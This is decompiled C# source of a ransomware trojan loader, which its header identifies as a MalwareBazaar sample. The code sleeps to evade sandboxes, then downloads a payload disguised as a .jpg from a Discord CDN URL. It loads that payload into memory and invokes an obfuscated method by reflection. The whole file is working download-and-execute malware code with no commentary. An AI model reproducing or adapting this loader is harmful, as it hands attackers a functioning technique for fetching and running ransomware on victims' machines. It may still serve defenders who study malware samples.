// Decompiled with JetBrains decompiler
// Type: Gbvpkm.Works
// Assembly: Wilasghdf, Version=91.0.4472.124, Culture=neutral, PublicKeyToken=null
// MVID: 7F847465-F148-43FC-8998-8FC5C0E4A8A8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-6e9c9ac34a3446c1e00c476dc95d01aaefc9efc3654641d3b712935f0730361e.exe

using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Gbvpkm
{
  internal class Works
  {
    internal static int Boss()
    {
      typeof (Thread).GetMethod("Sleep", new Type[1]
      {
        typeof (int)
      }).Invoke((object) null, new object[1]
      {
        (object) 10000
      });
      typeof (Thread).GetMethod("Sleep", new Type[1]
      {
        typeof (int)
      }).Invoke((object) null, new object[1]
      {
        (object) 10000
      });
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      return Works.Farmer(AppDomain.CurrentDomain.Load(new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/913584216825028612/945091500868501605/Wilasghdf.jpg").GetResponse().GetResponseStream()).ReadBytes(83157231).Access()).FullName);
    }

    internal static int Farmer(string name)
    {
      foreach (Assembly assembly in Thread.GetDomain().GetAssemblies())
      {
        if (assembly.FullName == name)
        {
          foreach (Type exportedType in assembly.GetExportedTypes())
          {
            if (exportedType.FullName == "Nlmcfbevakufryeprkylgv.Epuxiwsnbbmyxqhulrviriq")
            {
              foreach (MethodInfo method in exportedType.GetMethods())
              {
                if (method.Name == "Gzstmlmbauujzdz")
                  return Convert.ToInt32((object) (Environment.SpecialFolder) method.Invoke((object) null, (object[]) null));
              }
            }
          }
        }
      }
      return 1;
    }
  }
}
